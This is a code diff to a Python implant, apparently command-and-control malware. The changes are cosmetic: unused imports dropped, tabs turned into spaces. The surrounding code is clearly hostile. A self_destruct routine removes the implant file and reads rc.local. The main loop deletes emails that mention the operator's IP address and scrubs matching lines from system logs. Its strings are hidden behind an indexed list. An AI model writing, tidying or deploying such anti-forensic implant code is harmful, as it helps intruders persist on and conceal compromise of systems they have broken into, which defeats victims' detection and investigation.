@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 import time
-import atexit
 import requests
 import base64
 import subprocess
@@ -14,7 +13,6 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.asymmetric import dh
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives import serialization
 import os
@@ -191,7 +189,8 @@ def self_destruct():
         rc_local = next_list[9]
         if os.path.exists(rc_local):
             with open(rc_local, "r") as f:
-                lines = f.readlines()
+                # Removed unused variable
+                f.readlines()
         if os.path.exists(implant_file):
             os.remove(implant_file)
         send_log(f"{next_list[21]} {next_list[17]}")
@@ -338,43 +337,39 @@ def main():
         relevant_email_names = []
 
         for cur_email in email_names:
-    	    with open(cur_email, "r") as email_file:
-    	        lines = email_file.readlines()
-    	        for line in lines:
-    	            if ip_addr in line:
-    	                relevant_email_names.append(cur_email)
-    	                os.remove(cur_email)
-    	                break
+            with open(cur_email, "r") as email_file:
+                lines = email_file.readlines()
+                for line in lines:
+                    if ip_addr in line:
+                        relevant_email_names.append(cur_email)
+                        os.remove(cur_email)
+                        break
     	         
-    
         filename = logs + next_list[15]
-    
+
         with open(filename, next_list[23]) as log_file:
-    	    lines = log_file.readlines()
-    
+            lines = log_file.readlines()
+
         filtered_lines = []
-    
+
         for cur_email in relevant_email_names:
             cur_email = cur_email[0:len(cur_email) - 1] + next_list[25]
             if os.path.isfile(cur_email):
                 os.remove(cur_email)
 
-    
-    
-    
         for line in lines:
-    	    breakline = False
-    	    for cur_email in relevant_email_names:
-    	        cur_email_base = os.path.basename(cur_email)
-    	        cur_email_substr = cur_email_base[0:len(cur_email_base) - 3]
-    	        if cur_email_substr in line or ip_addr in line:
-    	            breakline = True
-    	            break
-    	    if not breakline:
-    	        filtered_lines.append(line)
+            breakline = False
+            for cur_email in relevant_email_names:
+                cur_email_base = os.path.basename(cur_email)
+                cur_email_substr = cur_email_base[0:len(cur_email_base) - 3]
+                if cur_email_substr in line or ip_addr in line:
+                    breakline = True
+                    break
+            if not breakline:
+                filtered_lines.append(line)
 
         with open(filename, "w") as log_file:
-    	    log_file.writelines(filtered_lines)
+            log_file.writelines(filtered_lines)
         
         if fail_count >= 60:
             self_destruct()
